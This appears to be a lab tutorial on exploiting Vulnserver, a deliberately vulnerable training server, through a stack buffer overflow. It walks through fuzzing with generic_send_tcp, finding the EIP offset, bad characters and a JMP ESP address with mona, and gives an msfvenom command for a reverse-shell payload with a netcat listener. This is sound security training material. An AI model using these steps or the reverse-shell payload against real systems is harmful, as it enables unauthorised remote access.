# Vulnserver
First you need to find what command can cause the vulnserver to crash.

This is done through a process known as spiking.

On Kali, you can use the command: generic_send_tcp 192.168.2.14 9999 trun.spk 0 0

The trunk.spk file contains:
s_readline();
s_string("TRUN ");
s_string_variable("0");

generic_send_tcp will loop and continue to send 0's to the vulnserver until it crashes.  Commands that aren't vulnerable to buffer overflow will not cause the server to crash.  You can note this difference between using the STATS command vs TRUN.

The idea behind the python script is similar.  It keeps sending data until the vulnserver crashes and calculates the number of bytes it sent to cause the crash.  In this case, about 3000 bytes.

The next step invovles finding the offset value (the part where we overwrite the EIP.  A tool called pattern create (provided by Metasploit) makes this easy.

/usr/share/metasploit-framework/tools/exploit/

./pattern_create.rb -l 3000

We update our python script to send the data generated.

We crash vulnserver again and note the value of the EIP when the crash occured.  In this case, the value is 386F4337.

We now use the pattern offset tool and provide this value to hopefully find an exact match. 

./pattern_offset -l 3000 -q 386F4337

In this case, an exact match occurs at 2003.  This information is critical because it tells us the exact area that we can control the EIP

We can test this by modifying our python script again.  We can send 2003 A's and then 4 B's.

Before we send our payload, we need to find bad characters.  When we generate shellcode, we need to know what characters are good and bad.

Modify the python script again and send the badchars.  It will once again crash vulnserver.  Right click on the ESP and select the option to "follow in dump."  This will bring you to the location in memory where the badchars were sent and we must check each hex value from 00 to FF to see if any characters were not sent.  For example, if you see 10, 11, 12, 14 you'll notice that 13 is a bad character.  Note all of the bad characters (if there are consecutive bad characters, the only bad character is the first character in that sequence -- however, if you want to be cautious you can take out both characters).  

We now need to find the right module: a module running inside a program that has no memory protection.  Mona Modules can be used inside immunity debugger to find the right module.

We use the command at the bottom of Immunity: !mona modules

We can see protection settings for .dll files associated with vulnserver.  For example, with essfunc.dll, we can see false under each of the protection settings.

We now need to find the opcode equivalent of a JMP.  To do this, on KALI we are going to locate nasm_shell.  Here were are trying to convert assembly language to hex code.

locate nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasmnasm > JMP ESP
00000000  FFE4              jmp esp

The hex equivalent of jmp esp is FFE4.

We now use the following command to find the JMP ESP location in vulnserver:

!mona find -s "\xff\xe4" -m essfunc.dll

This command will retrieve some return addresses and list the memory protections:

 Address=625011AF
 Message=  0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Mr Robot\Desktop\vulnserver-master\vulnserver-master\essfunc.dll)


With this information, we can go back and edit our python script.  Instead of having 4 B's in place of the EIP, we will put that pointer in its place.  *We have to enter in the pointer in reverse* 

625011AF = /xaf/x11/x50/x62

We can insert a breakpoint at this memory location with the JMP code so that the buffer overflows to this exact spot.

Generating Shellcode with MSFVenom:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.39 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

This command will generate a payload that can then be added to our python script.  Before we insert the shellcode into our script, we need to insert some nops (no operation).  They are represented with \x90.  We add 32 nops as padding between the jmp command and overflow.  If we don't add this, it's likely that the buffer overflow won't work.

Set up a netcat listener and then run the command to gain a reverse shell.
